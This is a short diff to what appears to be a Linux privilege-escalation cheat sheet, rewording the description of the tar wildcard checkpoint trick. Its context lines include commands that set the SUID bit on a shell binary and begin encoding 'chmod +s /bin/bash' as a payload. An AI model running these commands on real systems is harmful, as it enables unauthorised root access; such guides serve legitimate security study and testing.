@@ -233,7 +233,7 @@ chmod +xs share/shell.elf
 
 ## Tar Wildcard
 
-A script that calls a **tar** with `*` can be abused to execute arbitrary commands by creating checkpoint files in the target directory.
+A script that uses tar with a wildcard ( * ) is vulnerable to arbitrary command execution via maliciously crafted checkpoint files in the target directory.
 
 ```shell
 echo -n 'chmod +s /bin/bash' | base64
